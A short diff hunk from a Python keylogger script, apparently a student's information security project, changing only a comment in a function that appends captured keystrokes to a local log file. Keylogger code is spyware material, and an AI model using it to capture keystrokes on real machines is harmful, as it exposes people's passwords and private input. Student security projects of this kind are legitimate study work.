@@ -26,7 +26,7 @@ def on_press(key):
 
 
 def write_file(keys):
-    with open(f"C:\\1)SLIIT\\3rd Year\\2nd Semester\\Information Security Project\\Tests\\Test 2\\Key Logs\\{file_name}", "a") as f: #save files
+    with open(f"C:\\1)SLIIT\\3rd Year\\2nd Semester\\Information Security Project\\Tests\\Test 2\\Key Logs\\{file_name}", "a") as f: #save capture keyloggs
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
